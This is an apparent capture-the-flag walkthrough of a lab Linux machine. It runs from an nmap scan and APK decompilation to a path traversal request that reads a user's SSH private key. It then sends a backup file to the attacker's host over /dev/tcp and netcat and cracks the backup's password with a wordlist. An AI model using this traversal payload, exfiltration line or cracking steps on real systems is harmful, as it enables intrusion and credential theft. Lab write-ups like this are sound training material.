First, we launch an ICMP ping to verify if the target machine is active.

As we can see, the TTL value is close to 64, confirming that the target is a Linux machine.

Next, we perform a full port scan using Nmap:

sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.231.155 -oG allPorts

We then run basic service enumeration scripts against the discovered ports:

whatweb http://instant.htb/

The tool reports:

Downloading the application installer provides an Android APK file. We decompile it using apktool:

apktool d instant.apk

Executing the log-reading administrative endpoint:

We leverage path traversal via the log reading parameter to extract the SSH private key for user shirohige (../../../../../../home/shirohige/.ssh/id_rsa):

curl -sX GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fshirohige%2F.ssh%2Fid_rsa" -H "accept: application/json" -H "Authorization: <JWT_TOKEN>" | jq '.["/home/shirohige/logs/../../../../../../home/shirohige/.ssh/id_rsa"][]' | tr -d '"' | sed 's/\\n//' > id_rsa
chmod 600 id_rsa

Using the retrieved private key, we connect to the machine via SSH as user shirohige:

ssh -i id_rsa shirohige@10.129.231.155

Navigating to the backups directory:

We locate an encrypted Solar-PuTTY sessions backup file named sessions-backup.dat.

We transfer sessions-backup.dat to our attacking machine using netcat:

# On victim:
cat < sessions-backup.dat > /dev/tcp/10.10.16.167/443

# On attacker:
nc -nlvp 443 > sessions-backup.dat

We decrypt the backup using a Solar-PuTTY decryption Python script alongside rockyou.txt:

python3 SolarPuttyDecrypt.py sessions-backup.dat /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

The script successfully cracks the archive password: estrella.
